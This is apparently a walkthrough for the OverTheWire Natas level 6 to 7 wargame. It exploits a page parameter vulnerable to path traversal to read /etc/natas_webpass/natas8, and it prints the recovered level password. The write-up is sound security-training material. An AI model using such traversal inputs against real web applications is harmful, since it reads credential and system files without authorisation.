`Link` : `https://overthewire.org/wargames/natas/natas7.html`
## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟔 - 𝐋𝐞𝐯𝐞𝐥 𝟕

## 𝐆𝐢𝐯𝐞𝐧
- Username: natas7
- URL:      `http://natas7.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit: `http://natas7.natas.labs.overthewire.org`
- Click links! Notice: `index.php?page=<something>`
- We got the hint, directory traversal is possible using page! Now we need to know the path where password is stored.
- Let's view page source!

```
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
```
- Notice: `<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->`
- Visit: `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
- Boom!

<div align=center>
  <img src=https://user-images.githubusercontent.com/68887544/148734169-3a663e55-1799-4482-b443-75c45d1a8dbe.png width=500px>
</div>

- `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe `
